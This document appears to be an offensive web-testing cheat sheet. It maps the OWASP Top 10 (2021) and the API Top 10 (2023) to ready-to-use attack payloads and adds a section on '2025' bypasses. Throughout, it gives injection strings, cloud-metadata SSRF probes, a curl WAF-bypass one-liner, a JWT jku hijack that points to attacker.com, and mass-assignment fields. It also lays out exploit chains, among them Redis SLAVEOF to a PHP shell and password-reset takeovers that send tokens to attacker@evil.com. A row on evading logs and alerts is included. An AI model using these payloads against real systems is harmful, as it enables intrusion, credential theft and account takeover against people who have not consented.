# OWASP Top 10 (2021) + API Top 10 (2023) — Full Attack Instincts

## OWASP Top 10 (2021)

| # | Vulnerability | Attack Instinct | Priority Signal |
|---|---|---|---|
| A01 | Broken Access Control | `?id=1` → try 2, 3, -1, 0, `../`. Change `user_id` in JWT payload, cookies, POST body. IDOR on every object. Check `/api/v1/users/`, `/api/v1/orders/`, `/api/v1/invoices/` with another user's ID | Any endpoint with an ID parameter |
| A02 | Cryptographic Failures | Weak JWT (`HS256` + guessable secret), hardcoded keys in JS bundles, `/.env`, `/backup.zip`, `/config.php.bak`, `npm-debug.log`, `.git/config` | Public JS files, backup paths |
| A03 | Injection | SQL: `'`, `' OR '1'='1`, time-based `' AND SLEEP(5)--`. NoSQL: `{"$gt":""}`. LDAP: `*)(uid=*))(|(uid=*`. OS: `; id`, `| whoami`, `` `id` ``. SSTI: `{{7*7}}`, `${7*7}` | Any user input that reaches a backend system |
| A04 | Insecure Design | Timing enumeration (account exists?), missing rate limits on OTP/reset, negative cart quantities, free item with `quantity=-1`, coupon stacking | Auth flows, checkout, payment |
| A05 | Security Misconfiguration | Default creds (`admin:admin`, `admin:password`), debug endpoints (`/health`, `/metrics`, `/actuator`, `/console`, `/manager`, `/phpmyadmin`), verbose stack traces, directory listing | Every new subdomain/endpoint |
| A06 | Vulnerable Components | `X-Powered-By: Express 4.17.1` → CVE lookup. `/vendor/`, `package.json`, `Gemfile.lock`, `composer.lock` → version → exploit. Shodan: `org:"Target" vuln:CVE-XXXX` | Version disclosure anywhere |
| A07 | Auth Failures | Session fixation (set `session_id` before login, does it persist after?). Predictable reset tokens (timestamp-based, UUID v1). No MFA on high-privilege actions. Password in URL (`?token=abc` in reset link) | Login, registration, password reset |
| A08 | Data Integrity Failures | Java: `ysoserial` gadget chains. PHP: `O:8:"...":{}` unserialize. .NET: `ViewState` without MAC. CI/CD: inject into `package.json` scripts, GitHub Actions `${{ github.event.issue.title }}` | Serialized cookie values, ViewState, CI/CD pipelines |
| A09 | Logging Failures | Exploit without triggering alerts — avoid `X-Request-ID`, rotate IPs via proxychains, no sequential IDs in requests, space out requests to avoid rate-limit logs | When you're being stealthy |
| A10 | SSRF | Params: `url=`, `callback=`, `webhook=`, `file=`, `path=`, `dest=`, `redirect_uri=`. Probes: `http://169.254.169.254/latest/meta-data/iam/` (AWS), `http://metadata.google.internal/computeMetadata/v1/` (GCP), `http://100.100.100.200/latest/meta-data/` (Alibaba), `file:///etc/passwd`, `gopher://127.0.0.1:6379/` | Any param that causes a server-side fetch |

---

## API Top 10 (2023)

| # | API Issue | Attack Reflex | PoC Pattern |
|---|---|---|---|
| API1 | Broken Object Level Auth (BOLA) | Change object ID in every GET/POST/PUT/DELETE. Try sequential IDs, UUIDs from other responses, negative IDs. Test in GraphQL query variables too | `GET /api/v1/orders/1337` with victim's token → `GET /api/v1/orders/1338` |
| API2 | Broken User Authentication | JWT `alg:none` bypass. `kid` header path traversal (`"kid":"../../dev/null"`). Weak refresh tokens (short, predictable). OAuth `state` param not validated → CSRF | `jwt_tool.py <token> -X a` |
| API3 | Excessive Data Exposure | Add `?fields=password,credit_card,ssn,token` or GraphQL `{ user { password apiKey creditCard { number cvv } } }`. Look for hidden fields in responses that aren't shown in UI | GraphQL introspection + query for sensitive fields |
| API4 | Lack of Rate Limiting | Brute-force OTPs (4-6 digits = 10K combinations). Reset token enumeration. 2FA brute at 1000 req/min. Password spray. Turbo Intruder for race window | `intruder` with 1000 threads on OTP endpoint |
| API5 | Broken Function Level Auth (BFLA) | Access admin functions with regular user token: `DELETE /api/admin/users/1`, `GET /api/admin/export/all`, `POST /api/admin/config`. HTTP method switching: `POST → PUT`, add `X-HTTP-Method-Override: DELETE` | Admin endpoints with user-level JWT |
| API6 | Mass Assignment | POST/PUT to user profile with extra fields: `"role":"admin"`, `"isAdmin":true`, `"verified":true`, `"credits":99999`, `"subscription":"premium"`, `"canBypassPayment":true`. Check if reflected in GET response | Profile update endpoint |
| API7 | Security Misconfiguration | `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. Missing auth on OPTIONS. Debug headers in prod (`X-Debug-Token`, `X-Powered-By`). CORS wildcard on API that returns sensitive data | Every API response header |
| API8 | Injection (GraphQL) | Enable introspection: `{"query":"{__schema{types{name}}}"}`. Batch queries for rate limit bypass. Inject via variables: `{"query":"query($id:ID!){user(id:$id){email}}","variables":{"id":"1 OR 1=1"}}`. NoSQL via GraphQL args | `/graphql` endpoint |
| API9 | Improper Inventory | Zombie API versions with fewer controls: `/v1/`, `/api/v2/old/`, `/api/beta/`, `/api/internal/`. Check JS files and mobile app for old endpoints. Wayback Machine for deprecated routes | `gau target.com \| grep "/api/" \| sort -u` |
| API10 | Unsafe Consumption (SSRF via integrations) | Webhook URLs: does the server fetch your URL? `"webhook_url": "http://169.254.169.254/latest/meta-data/"`. Callback URLs in OAuth. Import-from-URL features. PDF generators fetching remote resources | Any feature that triggers a server-side HTTP request |

---

## 2025 Updates — New Attack Techniques

### SSRF — New Bypasses (2025)
- **IPv6 evasion**: Apps blocking `127.0.0.1` miss `[::1]`, `[::ffff:127.0.0.1]`, `[0:0:0:0:0:ffff:7f00:1]`
- **Credential parsing abuse**: `http://169.254.169.254@attacker.com/` — parser sees attacker.com as host, but some backends fetch the credentials part
- **Reverse**: `http://attacker.com@169.254.169.254/` — bypass allowlist if only checking start of URL
- **Azure CVE-2025-53767**: CVSS 10.0 — insufficient URL validation → Azure managed identity token theft

### XSS — AWS WAF 8KB Body Inspection Limit
AWS WAF's `CrossSiteScripting_BODY` rule only inspects the **first 8KB** of request bodies.
```
# Bypass: pad body with 8KB+ of junk before the payload
python3 -c "print('A'*8200 + '<script>alert(1)</script>')" | \
  curl -X POST TARGET -H "Content-Type: text/plain" -d @-
```

### JWT — New Attack: jku Header Hijack (2025)
```bash
# Server fetches JWKS from the "jku" header URL to verify signature
# Attacker-controlled: change jku to your own JWKS endpoint
python3 jwt_tool.py $TOKEN -X s -ju "https://attacker.com/jwks.json"
# Host a JWKS at attacker.com with your own keypair → forge any token

# Also test: jwk header embedding (embed your public key in the token itself)
python3 jwt_tool.py $TOKEN -X s  # self-signed attack
```

### OAuth — 2025 Attacks (Storm-2372, RFC 9700)
- **Device code flow abuse** (Storm-2372 APT): `POST /oauth/device_code` → send code link to victim → victim logs in → attacker polls and gets token (bypasses MFA entirely)
- **Consent phishing**: Malicious OAuth app requests excessive scopes — victim clicks "Allow" → attacker gets persistent token
- **DPoP bypass**: RFC 9700 introduced DPoP tokens bound to client cryptographically — test if server actually validates binding or just accepts any DPoP token
- **Token reuse across apps**: Token issued for App A accepted by App B due to missing `aud` claim validation

### Business Logic — OWASP Business Logic Abuse Top 10 (2025)
New framework launched 2025. 45% of cryptocurrency bug bounty awards come from business logic. Key additions:
- Negative quantity orders
- Currency conversion rounding exploitation  
- Loyalty point manipulation
- Subscription tier bypass via API parameter
- Coupon/voucher stacking beyond intended limits
- Race condition on high-value atomic operations

---

## Chaining OWASP + API Bugs

The real money is in chains. Common high-payout chains:

**A02 → A01:** Hardcoded API key in JS → use key to access admin API → BOLA on all user objects → mass PII dump

**A07 + API2:** Exposed session token in URL → extract from Wayback Machine → JWT confusion to escalate to admin

**SSRF → RCE:** SSRF to internal Redis → `SLAVEOF attacker:6379` → write PHP shell → RCE

**XXE → SSRF → Cloud creds:** File upload with SVG/XML → XXE → `file:///proc/net/arp` → pivot to SSRF → `http://169.254.169.254/` → IAM role credentials

**Mass Assignment → Account Takeover:** Add `"email":"attacker@evil.com"` to profile update → email changed without verification → password reset to attacker email

**Parameter Pollution → ATO:** `forgot-password?email=victim%40target.com&email=attacker%40evil.com` → reset token sent to attacker
